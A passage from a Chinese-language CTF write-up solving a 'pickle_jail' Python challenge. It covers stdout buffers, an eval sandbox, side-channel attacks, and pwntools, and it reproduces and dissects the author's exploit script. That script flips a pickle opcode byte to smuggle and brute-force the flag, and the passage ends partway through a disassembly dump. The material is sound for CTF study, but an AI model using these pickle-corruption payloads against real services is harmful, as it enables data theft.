(io.TextIOWrapper)。 用途：用于处理基于字符的输入输出操作。当你通过 print() 函数或者直接写入 sys.stdout 时，你实际上是在与这个文本文件对象打交道。 编码/解码：在写入数据时，Python 会根据指定的编码（默认为 UTF-8）自动将字符串转换为字节序列；读取数据时则相反，它会将字节序列解码回字符串。 换行符处理：文本模式下的文件对象还会处理换行符的转换。例如，在Windows平台上，\\n 会被替换为 \\r\\n。 示例 import sys 写入文本到标准输出\nsys.stdout.write(\u0026ldquo;Hello, world!\\n\u0026rdquo;) 在这个例子中，\u0026ldquo;Hello, world!\\n\u0026rdquo; 是一个字符串，它被发送到标准输出，并且 \\n 被正确地解释为换行符。\nsys.stdout.buffer (二进制模式) 类型：这是一个二进制文件对象 (io.BufferedWriter)。 用途：允许你绕过 Python 的文本编码和解码机制，直接写入原始的字节数据。这对于需要精确控制输出格式或处理非文本数据的情况非常有用。 编码/解码：由于它是二进制模式，所以不会自动执行任何编码或解码操作。你需要自己负责确保写入的数据是以正确的格式表示的。 换行符处理：二进制模式不会对换行符做任何特殊处理，所有字节都会按原样写入。 示例 import sys 写入字节数据到标准输出\nsys.stdout.buffer.write(b\u0026quot;Hello, world!\\n\u0026quot;) 这里，b\u0026quot;Hello, world!\\n\u0026quot; 是一个字节串，它包含实际的字节值而不是字符。注意前缀 b 表示这是一个字节串，而不是普通的字符串。\n总结 sys.stdout：适合于常规的文本输出，Python 会帮你处理编码和换行符等细节。 sys.stdout.buffer：适合于需要直接写入字节数据的场景，比如发送二进制数据或使用特定的编码方式而不依赖于Python的默认行为。 选择哪一个取决于你的具体需求。如果你只是想打印一些信息给用户看，通常使用 sys.stdout 或者更简单的 print() 函数就足够了。但如果你需要更细粒度的控制，比如实现自定义的日志记录格式、发送网络消息或者其他形式的二进制通信，则可能需要用到 sys.stdout.buffer。\ndata[num] += 1 data[num] %= 0xFF\ndata[num] += 1：将 data 中索引为 num 的字节增加1。 data[num] %= 0xFF：确保修改后的值仍然是一个有效的字节（0到255之间）。这是因为字节的最大值是255（即 0xFF），所以使用模运算 % 0xFF 来保证结果不超过这个范围。实际上，对于字节来说，通常使用 % 256 或者 % 0x100 更为准确，因为 % 0xFF 实际上是 % 255，这可能会导致不同的行为。 沙箱\nsafe_dic = { \u0026ldquo;builtins\u0026rdquo;: None, \u0026ldquo;n\u0026rdquo;: BytesIO(data), \u0026ldquo;F\u0026rdquo;: type(\u0026ldquo;f\u0026rdquo;, (Unpickler,), {\u0026ldquo;find_class\u0026rdquo;: lambda *_: \u0026ldquo;H4cker\u0026rdquo;}), }\n_builtins__ 设置为 None 的意图是限制 eval() 或其他类似函数的执行环境，防止它们访问 Python 的内置函数（如 open, exec, eval 等），从而减少潜在的安全风险。\nambda *_: \u0026quot;H4cker\u0026quot; 中，* 和 _ 的组合表示：\n\\*：收集所有位置参数并将其作为一个元组传递给函数体。这允许你创建一个能够接收任意数量参数的函数。 _：这是一个约定俗成的名字，用来表示“不关心”或“无用”的变量。它表明这些参数在这个上下文中不会被使用。 因此，*_ 意味着这个匿名函数可以接收任意数量的位置参数，但它们都将被忽略，因为函数体并不使用这些参数。\ntype(\u0026quot;f\u0026quot;, (Unpickler,), {...})：动态创建了一个名为 f 的新类，继承自 Unpickler。\n\u0026quot;find_class\u0026quot;: lambda \\*_: \u0026quot;H4cker\u0026quot;：为新类添加了一个名为 find_class 的方法，该方法由一个匿名函数实现。这个匿名函数接受任意数量的位置参数（通过 *_），但总是返回字符串 \u0026quot;H4cker\u0026quot;。\npython中的eval()\neval(expression, globals=None, locals=None) 函数用于执行一个字符串表达式，并返回表达式的值。它接受三个参数：\rexpression：要执行的字符串表达式。\rglobals（可选）：一个字典，表示全局命名空间。如果提供，它指定了可用的全局变量和函数。如果没有提供，则使用当前作用域的全局命名空间。\rlocals（可选）：一个映射对象（通常是字典），表示局部命名空间。如果提供，它指定了可用的局部变量和函数。如果没有提供，则使用当前作用域的局部命名空间。 对应题目就是\n\u0026#34;F(n).load()\u0026#34;：这是要执行的字符串表达式，意图是调用自定义 Unpickler 类 F 的 load 方法来反序列化数据。\rsafe_dic：这是一个字典，作为全局命名空间传递给 eval()。safe_dic 包含了对内置函数和其他可能危险的功能的限制，意图是创建一个受限的执行环境。\r{}：这是一个空字典，作为局部命名空间传递给 eval()。这意味着在执行表达式时，没有额外的局部变量或函数可以被访问。这进一步限制了表达式可以做的事情，因为它不能依赖于任何局部上下文。 name, players, _ = eval(\u0026ldquo;F(n).load()\u0026rdquo;, safe_dic, {})\n这行代码试图从 eval() 的结果中解包三个值：name, players, 和 _。\n潜在问题: 如果 eval() 执行失败或返回的结果不符合预期（例如不是包含三个元素的可迭代对象），那么这里会抛出一个 ValueError。 使用 eval() 来执行不受信任的代码是非常危险的行为，可能会导致任意代码执行漏洞。 以上就是对附件的基本了解，说实话依旧没有任何思路\n这里引用本题出题人师傅woodwhale的思路\n解题思路# 通过简单分析 pickle_jail.py 的源码，可以发现输入输出是使用 stdin.buffer 和 stdout.buffer 完成的，这个 buffer 输入和输出都是用bytes类型的数据，题目的流程如下：\n随机生成 50 个虚拟英文名称，并装入 players 数组中 让用户输入不超过 300 长度的 name，⚠️注意：类型是 bytes 将 name 存入 players 中 将 (name, players, flag) 这个三元组 pickle 序列化 有一次机会让数组序列化后的 bytearray 的指定下标的数值 +1 Unpickler 反序列化之前的三元组，但是重写了 Unpickler.find_class 判断 if name in players 这题的预期解是侧信道，解法有两种，先给其中一种 exp 再做分析。\n侧信道# 第一次了解，这里粘贴一下ai的解释\n侧信道攻击（Side-Channel Attack）是一种通过分析系统在运行过程中泄露的物理信息（如时间、功耗、电磁辐射等）来获取敏感信息的攻击方式。与传统的基于软件或协议漏洞的攻击不同，侧信道攻击利用的是系统的实现细节和物理特性。\n侧信道攻击的基本概念# 侧信道攻击的核心思想是，即使一个系统在逻辑上是安全的，其物理实现过程中的某些特征也可能泄露有价值的信息。攻击者通过仔细观察和分析这些特征，可以推断出系统内部的状态或秘密数据。常见的侧信道攻击类型包括：\n时间分析：通过测量操作完成所需的时间来推断信息。例如，加密算法中不同的密钥可能需要不同的时间来处理，这可以用来推测密钥的一部分。 功率分析：通过监测设备在执行特定操作时的功耗变化来获取信息。例如，AES 加密的不同轮次可能会有不同的功耗模式，攻击者可以通过分析这些模式来恢复密钥。 电磁泄漏：通过捕捉设备在工作时发出的电磁辐射来获取信息。某些高频信号可以直接反映内部计算状态。 声学分析：通过监听设备发出的声音（如硬盘寻道声、键盘敲击声）来获取信息。 错误注入：通过引入硬件故障或异常情况（如电压波动、温度变化）来触发非预期行为，并从中获取信息。 缓存攻击：通过分析内存缓存的访问模式来获取信息。例如，Flushing and Reloading 攻击利用共享缓存来监视另一个进程的数据访问模式。 应用场景# 侧信道攻击广泛应用于攻击各种加密系统、智能卡、嵌入式设备和其他涉及敏感数据处理的硬件。它们特别适用于那些看似逻辑上安全但物理实现存在弱点的系统。\n示例# 时间分析攻击 AES# 假设你有一个 AES 加密系统，其中部分子程序的执行时间取决于密钥的具体值。攻击者可以通过多次测量加密操作所需的时间，并统计分析这些时间差异，最终推断出部分或全部密钥信息。\n功率分析攻击 RSA# 在 RSA 解密过程中，私钥的操作会导致功耗的变化。攻击者可以使用高精度的功耗测量工具，在解密过程中记录功耗曲线，然后通过相关性分析来恢复私钥。\n如何防御侧信道攻击# 物理隔离：确保敏感操作在一个完全受控且隔离的环境中进行，减少外部可探测的信息泄露。 恒定时间算法：设计和实现不依赖于秘密数据的执行路径长度的算法，使得每次执行的时间相同。 随机化：在加密操作中引入随机性，使得同样的输入每次产生不同的输出模式，从而混淆攻击者的分析。 屏蔽和过滤：对设备进行物理上的屏蔽，减少电磁泄漏；或者使用滤波器去除不必要的信号。 多层保护：结合多种防护措施，增加攻击难度。 结合你的代码情景# 如果题目提到“预期解是侧信道”，那么很可能是在暗示你需要考虑代码执行过程中可能泄露的信息。例如：\n时间分析：如果你的代码在不同条件下执行的时间不同，攻击者可能通过测量这些时间差异来推断出一些秘密信息。 缓存攻击：如果你的代码频繁访问某些特定内存位置，攻击者可能通过分析缓存命中或未命中的情况来获取信息。 为了防止这类攻击，你可以采取措施使代码的执行时间和内存访问模式尽可能一致，避免因为秘密数据的不同而导致的行为差异。\n总之，侧信道攻击是一类复杂的攻击手段，它要求攻击者具备深入理解目标系统的物理特性和实现细节的能力。对于开发者来说，意识到潜在的侧信道风险并采取适当的防御措施是非常重要的。\nexp:# 一些给的题目给的信息\nPython 3.10 的 alpine 镜像 + Faker 随机生成数据的一个库，并且为了减少爆破次数 flag 的格式也告诉了是 flag{UUID4}\nUUID4 是一种基于随机数生成的通用唯一标识符（Universally Unique Identifier, UUID）。UUID 是一种128位的值，广泛用于为信息对象创建唯一的标识符。UUID4 特指使用随机数算法生成的 UUID，它是四种主要版本的 UUID 之一（其他版本包括时间戳、名称空间和散列等）。 一个 UUID 通常表示为由连字符分隔的32个十六进制数字:\r123e4567-e89b-12d3-a456-426614174000\r这32个字符可以分为五个部分，格式如下：\rxxxxxxxx-xxxx-Mxxx-xxxx-xxxxxxxxxxxx\r其中 M 表示 UUID 的版本号，对于 UUID4 来说，这个位置固定为 4。 分析一下师傅给的exp\nfrom string import ascii_lowercase, digits from pwn import context, p32, process, remote DEBUG = False context.log_level = \u0026#34;debug\u0026#34; if DEBUG else \u0026#34;error\u0026#34; HOST, PORT = \u0026#34;127.0.0.1\u0026#34;, 5000 flag = \u0026#34;flag{\u0026#34; str_set = \u0026#34;-\u0026#34; + ascii_lowercase + digits while len(flag) != 41: print(\u0026#34;flag:\u0026#34;, flag) for i in str_set: print(\u0026#34;try\u0026#34;, i) io = ( process(\u0026#34;python3 ./pickle_jail.py\u0026#34;, shell=True) if DEBUG else remote(HOST, PORT) ) io.recvuntil(b\u0026#34;Play this game to get the flag with these players: \u0026#34;) players = io.recvline(keepends=False).strip().strip(b\u0026#34;!\u0026#34;) players = eval(players.decode()) tmp_flag = flag + i tmp_flag_len = len(tmp_flag) if tmp_flag_len == 10: # 不可为 10 即 \\n, 否则会被 input 截断 tmp_flag = flag[1:] + i tmp_flag_len = len(tmp_flag) payload = b\u0026#34;C\u0026#34; payload += bytes([tmp_flag_len]) payload += tmp_flag.encode() pad = 3 * len(players) + sum(map(len, players)) + 302 - tmp_flag_len payload += b\u0026#34;B\u0026#34; + p32(pad) payload = payload.ljust(0x103, b\u0026#34;\\xff\u0026#34;) io.sendlineafter(b\u0026#34;What\u0026#39;s your name?\u0026#34;, payload) io.sendafter(b\u0026#34;win: \u0026#34;, bytes([11])) data = io.recvuntil(b\u0026#34;flag!\u0026#34;) if b\u0026#34;joined\u0026#34; in data and tmp_flag.encode() in data: flag += i io.close() break io.close() print(f\u0026#34;Flag is : {flag+\u0026#39;}\u0026#39;}\u0026#34;) 认识一下pwn库\nfrom pwn import context, p32, process, remote\npwn库# pwn 是一个强大的Python库，专门用于开发和执行渗透测试工具、编写漏洞利用代码（exploits）以及进行二进制安全研究。它提供了丰富的功能来简化与进程、网络连接、格式化字符串漏洞、缓冲区溢出等相关的操作。下面是对你提到的几个具体函数和模块的详细介绍：\ncontext# context 模块用于设置和获取当前的上下文环境配置。这些配置可以影响 pwntools 中其他模块的行为，例如如何解释地址、使用哪种架构或操作系统等。\n常用属性：# context.arch：指定目标程序的架构（如 i386, amd64, arm, aarch64 等）。 context.os：指定目标的操作系统（如 linux, windows 等）。 context.endian：指定字节序（如 little, big）。 context.bits：指定目标架构的位数（如 32, 64）。 context.log_level：控制日志输出的详细程度（如 debug, info, warn, error）。 示例：# from pwn import context # 设置日志级别为 debug context.log_level = \u0026#39;debug\u0026#39; # 设置目标架构为 64 位 Linux context.update(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) p32# p32 函数用于将一个整数转换为 32 位小端字节序的字节数组。这对于构建特定格式的有效载荷非常有用，尤其是在处理缓冲区溢出或其他低级漏洞时。\n示例：# from pwn import p32 # 将整数 0xdeadbeef 转换为 32 位小端字节序 payload = p32(0xdeadbeef) print(payload) # 输出: b\u0026#39;\\xef\\xbe\\xad\\xde\u0026#39; process# process 函数用于启动本地进程并与之交互。它可以方便地与命令行工具或自定义编写的程序进行通信，适用于开发和测试漏洞利用代码。\n参数：# argv：要执行的命令及其参数，可以是字符串或列表。 shell=True/False：是否通过 shell 执行命令，默认为 False。 env：传递给子进程的环境变量。 stdin, stdout, stderr：指定标准输入、输出和错误流。 示例：# from pwn import process # 启动一个本地进程 p = process([\u0026#39;cat\u0026#39;]) # 发送数据到标准输入 p.sendline(b\u0026#39;Hello, world!\u0026#39;) # 接收并打印输出 print(p.recvline()) # 输出: b\u0026#39;Hello, world!\\n\u0026#39; remote# remote 函数用于创建一个到远程服务器的TCP连接，并提供类似文件对象的方法来进行读写操作。这在攻击远程服务或参与CTF竞赛时特别有用。\n参数：# host：目标主机的IP地址或域名。 port：目标主机上的端口号。 ssl=True/False：是否使用SSL/TLS加密，默认为 False。 timeout：连接超时时间。 示例：# from pwn import remote # 连接到远程服务器 r = remote(\u0026#39;example.com\u0026#39;, 1234) # 发送数据到服务器 r.sendline(b\u0026#39;GET / HTTP/1.1\u0026#39;) # 接收并打印响应 print(r.recvuntil(b\u0026#39;\\r\\n\\r\\n\u0026#39;)) # 输出: HTTP响应头 # 关闭连接 r.close() 总结# context：用于设置和获取当前上下文环境配置，影响其他模块的行为。 p32：将整数转换为 32 位小端字节序的字节数组，常用于构建有效载荷。 process：启动本地进程并与之交互，适用于开发和测试漏洞利用代码。 remote：创建一个到远程服务器的TCP连接，支持读写操作，常用于攻击远程服务或参与CTF竞赛。 这些工具共同构成了 pwntools 库的核心功能，使得开发者能够更高效地进行二进制安全研究和漏洞利用开发。\n代码分析# str_set = \u0026ldquo;-\u0026rdquo; + ascii_lowercase + digits\n字符集：str_set 包含所有可能的字符，包括连字符、小写字母和数字，用于尝试构建完整的标志。 while len(flag) != 41:\n\u0026#39;flag{\u0026#39; 五个字符 + 32 + 4 =41 io.recvuntil(b\u0026quot;Play this game to get the flag with these players: \u0026ldquo;) players = io.recvline(keepends=False).strip().strip(b\u0026rdquo;!\u0026quot;) players = eval(players.decode())\n这段代码展示了如何通过网络或本地进程与一个服务进行交互，接收并处理特定格式的数据。\nrecvuntil() 方法：这个方法从 io 对象（可能是 process 或 remote 对象）中读取数据，直到遇到指定的字符串（这里是 b\u0026#34;Play this game to get the flag with these players: \u0026#34;）。它会返回所有接收到的数据，包括终止字符串。\r作用：确保在发送有效载荷之前，已经收到了预期的提示信息。这有助于同步客户端和服务端之间的通信。 recvline() 方法：这个方法读取一行数据（以换行符 \\n 结尾），并可以选择是否保留结尾的换行符。这里的 keepends=False 参数表示不保留换行符。\rstrip() 方法：去除字符串两端的空白字符（如空格、制表符等）。这里使用了两次 strip()：\r第一次去掉空白字符。\r第二次去掉字符串两端的 ! 字符（假设服务端输出格式为 players: [list]!）。\r作用：提取并清理玩家列表的字符串表示形式，以便后续处理。 decode() 方法：将字节串转换为字符串（默认使用 UTF-8 编码）。\reval() 函数：执行传入的字符串作为 Python 表达式，并返回表达式的值。在这里，eval() 用来解析并评估玩家列表的字符串表示形式，将其转换为实际的 Python 数据结构（如列表）。\r作用：将字符串形式的玩家列表转换为 Python 的列表对象，方便后续逻辑操作。 if tmp_flag_len == 10: # 不可为 10 即 \\n, 否则会被 input 截断 tmp_flag = flag[1:] + i tmp_flag_len = len(tmp_flag)\n换行符的影响： 在许多操作系统中，换行符 \\n 通常表示一个完整的输入行结束。如果 tmp_flag 的长度恰好为 10，并且服务端代码使用了 input() 或类似函数来读取输入，那么这个长度可能正好对应于一个换行符的位置。 为了避免上述问题，代码中采取了一种调整策略，当 tmp_flag 的长度为 10 时，去除第一个字符并添加当前尝试的字符 i payload = b\u0026quot;C\u0026quot; payload += bytes([tmp_flag_len]) payload += tmp_flag.encode() pad = 3 * len(players) + sum(map(len, players)) + 302 - tmp_flag_len payload += b\u0026quot;B\u0026quot; + p32(pad) payload = payload.ljust(0x103, b\u0026quot;\\xff\u0026quot;)\n构建有效载荷：创建一个包含特定格式的数据包 payload，用于发送给服务端。 开头用字符 C 标记。 接着是 tmp_flag 的长度。 然后是 tmp_flag 的编码形式。 计算填充长度 pad 并将其添加到 payload 中。 最后使用 \\xff 字节填充至固定长度 0x103。 细化\n3 * len(players)：每个玩家的名字可能需要额外的固定开销（例如，每个玩家名字前后的分隔符或其他结构化信息）。假设每个玩家名字前后各有一个字节的分隔符，那么总开销就是 3 * len(players)。\rsum(map(len, players))：计算所有玩家名字的总长度。map(len, players) 对 players 列表中的每个元素调用 len() 函数，并返回一个迭代器，sum() 则对这些长度求和。\r302：这是一个固定的偏移量或常数，可能是为了确保整个有效载荷达到某个特定的总长度。这个值的具体含义取决于服务端的实现细节，通常是为了对齐某些边界条件或满足特定协议要求。\r- tmp_flag_len：减去 tmp_flag 的长度，以确保最终的 pad 值是剩余需要填充的字节数。\rpad：最终计算出的填充长度。\rp32(pad)：将 pad 转换为 32 位小端字节序的字节数组。p32 是 pwntools 库中的一个函数，专门用于这种转换。这一步骤可能是为了告知服务端后续需要多少个填充字节。\rljust(0x103, b\u0026#34;\\xff\u0026#34;)：将 payload 左对齐并填充至长度为 0x103 字节，不足的部分用 \\xff（即 255）填充。这样做是为了确保发送的数据包具有固定的长度，这对于某些协议或漏洞利用来说非常重要。 io.sendlineafter(b\u0026quot;What\u0026rsquo;s your name?\u0026quot;, payload)\nsendlineafter() 方法：这个方法用于在接收到指定提示信息后发送一行数据。它会等待直到遇到 b\u0026quot;What's your name?\u0026quot; 字符串，然后发送 payload 并自动添加换行符 \\n。\n作用：确保在正确的时间点发送有效载荷，避免因过早或过晚发送而导致通信不同步。\nio.sendafter(b\u0026quot;win: \u0026ldquo;, bytes([11]))\nsendafter() 方法：这个方法用于在接收到指定提示信息后立即发送数据，但不会自动添加换行符。 bytes([11])：发送一个包含单个字节 11 的字节数组。这可能是为了满足服务端某种特定的输入要求，例如确认某个状态或触发某些逻辑。 作用：发送额外的数据以完成交互过程，确保所有必要的输入都已提供给服务端。 data = io.recvuntil(b\u0026quot;flag!\u0026rdquo;)\nrecvuntil() 方法：这个方法读取数据，直到遇到指定字符串（这里是 b\u0026quot;flag!\u0026quot;），并返回所有接收到的数据，包括终止字符串。 作用：获取服务端的响应，特别是包含标志信息的部分，以便后续分析。 if b\u0026quot;joined\u0026quot; in data and tmp_flag.encode() in data:\n​\tflag += i\n​\tio.close()\n​\tbreak\n条件检查 b\u0026quot;joined\u0026quot; in data：检查服务端响应中是否包含字符串 joined，这可能表示玩家成功加入了游戏。 tmp_flag.encode() in data：检查服务端响应中是否包含当前猜测的 tmp_flag 字符串。通过编码为字节串来进行比较，确保与接收的数据格式一致。 逻辑处理 如果上述两个条件都满足，则认为当前猜测的字符是正确的，将其添加到 flag 中。 关闭连接并跳出循环，继续尝试下一个字符。 io.close()\n关闭连接：无论是否成功找到正确的字符，都会关闭与服务端的连接，释放资源。 print(f\u0026quot;Flag is : {flag+\u0026rsquo;}\u0026rsquo;}\u0026quot;)\n输出完整标志：当循环结束时，打印完整的标志字符串。这里假设标志的结尾是 }，因此在最终输出时添加了一个右花括号。 细化思路\n发送有效载荷：\r首先等待服务端提示 What\u0026#39;s your name?，然后发送精心构造的 payload。这一步是为了确保每次发送的有效载荷都在正确的上下文中被处理。\r发送额外数据：\r接着发送一个额外的字节 [11] 来完成交互。这可能是为了确认某种状态或触发服务端的下一步操作。\r接收响应：\r读取服务端的响应，直到遇到 flag! 提示。这样可以确保获取到包含标志信息的部分响应。\r检查条件：\r检查服务端响应中是否包含 joined 和当前猜测的 tmp_flag。如果两者都存在，则认为当前猜测的字符是正确的，更新 flag 并结束本轮尝试。\r关闭连接：\r不论是否找到正确的字符，都关闭与服务端的连接，确保资源得到及时释放。\r输出结果：\r当所有字符都被成功猜出后，打印完整的标志字符串。 整理：# ​\t由附件可以知道无法引用python内置类进行rce之类的操作。然后回显点有print(name) ,而name又是可控的。所以关注点自然要放到利用name导出flag。\n​\t这个data = bytearray(biox.getvalue()),包含name,players,flag 。而且players.append(name)，players中有有name在结尾。\n​\tname, players, _ = eval(\u0026ldquo;F(n).load()\u0026rdquo;, safe_dic, {})，这里将反序列化的值，分别复制。很自然的就想到利用让flag出现在name中\ndata[num] += 1 data[num] %= 0xFF 这两个就是突破口。\n这里需要知道个特性，也是其中一中解法的核心，也就是如何控制name的核心。\n​\tproto 是 4 的版本，其次这个SHORT_BINBYTES，查看 pickle 的源代码，在Protocol 3 的部分可以看到 C 的定义，小于 256 字节的 bytes 都是用 C 进行序列化的。形如:C\\x03aaa(注意是b\u0026rsquo;aaa')\n当大于256大于256字节将会是B进行序列化，而且长度识别是四个字节表示，形如:B\\x00\\x00\\x00\\x00 超过256字节的字节串\n# Protocol 3 (Python 3.x)\rBINBYTES = b\u0026#39;B\u0026#39; # push bytes; counted binary string argument\rSHORT_BINBYTES = b\u0026#39;C\u0026#39; # \u0026#34; \u0026#34; ; \u0026#34; \u0026#34; \u0026#34; \u0026#34; \u0026lt; 256 bytes 核心# ​\tB和C的ascii码就只相差1，结合附件的data[num] += 1，便可以实现B\u0026mdash;\u0026gt;C的变化，从而引起，我们写的name长度远大于变化后能序列化的长度。也就造成了类似php反序列化逃逸的这种感觉。题目预期是我们输一个正常的name，然后C序列化，把这个名字加入players,然后判断name在不在players中，在就打印这个name并返回一个joined this game, but here is no flag! 。\n​\t但是我们让题目本身C序列化变成B序列化，然后B序列化的长度识别是四个字节，而C序列化的长度识别是一个字节。可以让B序列化变成C序列化后，通过变化得来的C序列化，有四个字节(原B序列化长度识别位),自己用一个字节作为长度识别位，然后这个长度识别位刚好是\\x03的话，后面的三给字节的数据就会被吃掉。剩下的就是我们B序列化留下的name的具体值，也就是正常题目预期的例如jack的这种名字。但是我们利用了B序列化，所以留下的是超过256个字节的我们提交的name值。\n​\t也就是通过name值，构造payload。payload里面的大致思想就是Unpickler 反序列化之前的三元组，name, players, _ = eval(\u0026ldquo;F(n).load()\u0026rdquo;, safe_dic, {})。\n以及这段代码：\nif name in players: del _ print(f\u0026#34;{name} joined this game, but here is no flag!\u0026#34;) //in 操作符会检查 name 是否作为子串存在于 players 中。 ​\t然后进行任意写入data,题目原B序列变C序列，序列化了一个无所谓的值。我们这里就要重新构造name.也就是原题目会有三给对象，而我们会多出一个那给被我们一开始废掉的序列化值（B变C的那个部分）。注意是从栈顶取。所以后面会有个无关紧要的报错就是stack不为空，留下的就是它。\n​\t让name等于flag或flag的一部分（我们写脚本爆破），然后players中含有真正的flag{UUID4},这样通过捕获响应信息就知道是否name的flag值是对的。\n测试\nfrom pickletools import dis data = bytearray(b\u0026#39;\\x80\\x04\\x95\\x14\\x02\\x00\\x00\\x00\\x00\\x00\\x00C\\x06messir\\x94]\\x94(C\\x07Heather\\x94C\\x06Sharon\\x94C\\x06Hannah\\x94C\\x05Kelli\\x94C\\x06Teresa\\x94C\\x06Thomas\\x94C\\x08Veronica\\x94C\\x05Susan\\x94C\\x06Eileen\\x94C\\x07Kristin\\x94C\\x0bChristopher\\x94C\\x08Kristina\\x94C\\x08Michelle\\x94C\\x05Bryan\\x94C\\x05Jerry\\x94C\\x07Michael\\x94C\\x06Shelby\\x94C\\x07Tiffany\\x94C\\x05Erika\\x94C\\x06Robert\\x94C\\x08Courtney\\x94C\\x06Angela\\x94C\\x04Erin\\x94C\\x06Nicole\\x94C\\x07Jeffrey\\x94C\\x07Colleen\\x94C\\x07William\\x94C\\x06Deanna\\x94C\\x05James\\x94C\\x06Stacey\\x94C\\x05Terri\\x94C\\x05Sarah\\x94C\\x06Alicia\\x94C\\x05Maria\\x94C\\x06Rickey\\x94C\\x07Natalie\\x94C\\x07Richard\\x94C\\x07Garrett\\x94C\\x06Amanda\\x94C\\x05Jason\\x94C\\x05Tammy\\x94C\\x04Dana\\x94C\\x05Jamie\\x94C\\x04John\\x94C\\x06Brandi\\x94C\\tAlejandro\\x94C\\x08Danielle\\x94C\\tAlexandra\\x94C\\x08Brittany\\x94C\\x07Melissa\\x94h\\x00e\\x8c*flag{f0192fd3-f87f-4693-a28d-a6e24766c143}\\x94\\x87\\x94.\u0026#39;) dis(data) 看一下pickle序列化字节串的反编译\n直接用师傅原本的数据，只是将woodwhale改成messir,\\t不变\n┌──(root㉿kali)-[~/python] └─# python pickle_jail.py 0: \\x80 PROTO 4 2: \\x95 FRAME 532 11: C SHORT_BINBYTES b\u0026#39;messir\\x94]\\x94\u0026#39; //关键位置 22: ( MARK 23: C SHORT_BINBYTES b\u0026#39;Heather\u0026#39; 32: \\x94 MEMOIZE (as 0) 33: C SHORT_BINBYTES b\u0026#39;Sharon\u0026#39; 41: \\x94 MEMOIZE (as 1) 42: C SHORT_BINBYTES b\u0026#39;Hannah\u0026#39; 50: \\x94 MEMOIZE (as 2) 51: C SHORT_BINBYTES b\u0026#39;Kelli\u0026#39; 58: \\x94 MEMOIZE (as 3) 59: C SHORT_BINBYTES b\u0026#39;Teresa\u0026#39; 67: \\x94 MEMOIZE (as 4) 68: C SHORT_BINBYTES b\u0026#39;Thomas\u0026#39; 76: \\x94 MEMOIZE (as 5) 77: C SHORT_BINBYTES b\u0026#39;Veronica\u0026#39; 87: \\x94 MEMOIZE (as 6) 88: C SHORT_BINBYTES b\u0026#39;Susan\u0026#39; 95: \\x94 MEMOIZE (as 7) 96: C SHORT_BINBYTES b\u0026#39;Eileen\u0026#39; 104: \\x94 MEMOIZE (as 8) 105: C SHORT_BINBYTES b\u0026#39;Kristin\u0026#39; 114: \\x94 MEMOIZE (as 9) 115: C SHORT_BINBYTES b\u0026#39;Christopher\u0026#39; 128: \\x94 MEMOIZE (as 10) 129: C SHORT_BINBYTES b\u0026#39;Kristina\u0026#39; 139: \\x94 MEMOIZE (as 11) 140: C SHORT_BINBYTES b\u0026#39;Michelle\u0026#39; 150: \\x94 MEMOIZE (as 12) 151: C SHORT_BINBYTES b\u0026#39;Bryan\u0026#39; 158: \\x94 MEMOIZE (as 13) 159: C SHORT_BINBYTES b\u0026#39;Jerry\u0026#39; 166: \\x94 MEMOIZE (as 14) 167: C SHORT_BINBYTES b\u0026#39;Michael\u0026#39; 176: \\x94 MEMOIZE (as 15) 177: C SHORT_BINBYTES b\u0026#39;Shelby\u0026#39; 185: \\x94 MEMOIZE (as 16) 186: C SHORT_BINBYTES b\u0026#39;Tiffany\u0026#39; 195: \\x94 MEMOIZE (as 17) 196: C SHORT_BINBYTES b\u0026#39;Erika\u0026#39; 203: \\x94 MEMOIZE (as 18) 204: C SHORT_BINBYTES b\u0026#39;Robert\u0026#39; 212: \\x94 MEMOIZE (as 19) 213: C SHORT_BINBYTES b\u0026#39;Courtney\u0026#39; 223: \\x94 MEMOIZE (as 20) 224: C SHORT_BINBYTES b\u0026#39;Angela\u0026#39; 232: \\x94 MEMOIZE (as 21) 233: C SHORT_BINBYTES b\u0026#39;Erin\u0026#39; 239: \\x94 MEMOIZE (as 22) 240: C SHORT_BINBYTES b\u0026#39;Nicole\u0026#39; 248: \\x94 MEMOIZE (as 23) 249: C SHORT_BINBYTES b\u0026#39;Jeffrey\u0026#39; 258: \\x94 MEMOIZE (as 24) 259: C SHORT_BINBYTES b\u0026#39;Colleen\u0026#39; 268: \\x94 MEMOIZE (as 25) 269: C SHORT_BINBYTES b\u0026#39;William\u0026#39; 278: \\x94 MEMOIZE (as 26) 279: C SHORT_BINBYTES b\u0026#39;Deanna\u0026#39; 287: \\x94 MEMOIZE (as 27) 288: C SHORT_BINBYTES b\u0026#39;James\u0026#39; 295: \\x94 MEMOIZE (as 28) 296: C SHORT_BINBYTES b\u0026#39;Stacey\u0026#39; 304: \\x94 MEMOIZE (as 29) 305: C SHORT_BINBYTES b\u0026#39;Terri\u0026#39; 312: \\x94 MEMOIZE (as 30) 313: C SHORT_BINBYTES b\u0026#39;Sarah\u0026#39; 320: \\x94 MEMOIZE (as 31) 321: C SHORT_BINBYTES b\u0026#39;Alicia\u0026#39; 329: \\x94 MEMOIZE (as 32) 330: C SHORT_BINBYTES b\u0026#39;Maria\u0026#39; 337: \\x94 MEMOIZE (as 33) 338: C SHORT_BINBYTES b\u0026#39;Rickey\u0026#39; 346: \\x94 MEMOIZE (as 34) 347: C SHORT_BINBYTES b\u0026#39;Natalie\u0026#39; 356: \\x94 MEMOIZE (as 35) 357: C SHORT_BINBYTES b\u0026#39;Richard\u0026#39; 366: \\x94 MEMOIZE (as 36) 367: C SHORT_BINBYTES b\u0026#39;Garrett\u0026#39; 376: \\x94 MEMOIZE (as 37) 377: C SHORT_BINBYTES b\u0026#39;Amanda\u0026#39; 385: \\x94 MEMOIZE (as 38) 386: C SHORT_BINBYTES b\u0026#39;Jason\u0026#39; 393: \\x94 MEMOIZE (as 39) 394: C SHORT_BINBYTES b\u0026#39;Tammy\u0026#39; 401: \\x94 MEMOIZE (as 40) 402: C SHORT_BINBYTES b\u0026#39;Dana\u0026#39; 408: \\x94 MEMOIZE (as 41) 409: C SHORT_BINBYTES b\u0026#39;Jamie\u0026#39; 416: \\x94 MEMOIZE (as 42) 417: C SHORT_BINBYTES b\u0026#39;John\u0026#39; 423: \\x94 MEMOIZE (as 43) 424: C SHORT_BINBYTES b\u0026#39;Brandi\u0026#39; 432: \\x94 MEMOIZE (as 44) 433: C SHORT_BINBYTES b\u0026#39;Alejandro\u0026#39; 444: \\x94 MEMOIZE (as 45) 445: C SHORT_BINBYTES b\u0026#39;Danielle\u0026#39; 455: \\x94 MEMOIZE (as 46) 456: C SHORT_BINBYTES b\u0026#39;Alexandra\u0026#39; 467: \\x94 MEMOIZE (as 47) 468: C SHORT_BINBYTES b\u0026#39;Brittany\u0026#39; 478: \\x94 MEMOIZE (as 